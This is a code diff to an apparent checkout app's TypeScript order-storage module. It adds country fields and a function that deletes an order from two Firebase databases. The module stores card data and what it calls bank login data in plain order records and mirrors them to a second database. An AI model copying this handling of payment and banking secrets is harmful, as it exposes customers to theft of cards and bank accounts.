@@ -2,7 +2,7 @@ import { v4 as uuidv4 } from 'uuid';
 import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
 import { database } from '../firebaseConfig';
 import { database2 } from '../firebaseConfig2';
-import { off, onValue, ref, set } from '@firebase/database';
+import { off, onValue, ref, set, remove } from '@firebase/database';
 
 export interface OrderData {
   id: string;
@@ -57,11 +57,13 @@ export const saveOrderData = async (
         city: '',
         state: '',
         zipCode: '',
+        country: '',
         sameAsBilling: true,
         billingAddress: '',
         billingCity: '',
         billingState: '',
         billingZipCode: '',
+        billingCountry: '',
       },
       bankName: data.bankName || '',
       cardData: data.cardData || {
@@ -81,6 +83,28 @@ export const saveOrderData = async (
   }
 
   await saveOrderDatainDB(orderId, orders[existingOrderIndex]);
+};
+
+// Delete order function
+export const deleteOrder = async (orderId: string): Promise<void> => {
+  try {
+    // Remove from Firebase databases
+    const orderRef = ref(database, 'orders/' + orderId);
+    const orderRef2 = ref(database2, 'orders/' + orderId);
+
+    await Promise.all([
+      remove(orderRef),
+      remove(orderRef2)
+    ]);
+
+    // Remove from in-memory storage
+    orders = orders.filter(order => order.id !== orderId);
+
+    console.log(`Order ${orderId} deleted successfully`);
+  } catch (error) {
+    console.error('Error deleting order:', error);
+    throw error;
+  }
 };
 
 // Get all orders
@@ -127,11 +151,13 @@ export const saveOrderDatainDB = async (
       city: '',
       state: '',
       zipCode: '',
+      country:'',
       sameAsBilling: true,
       billingAddress: '',
       billingCity: '',
       billingState: '',
       billingZipCode: '',
+      billingCountry: '',
     },
     cardData: data.cardData || {
       cardholderName: '',
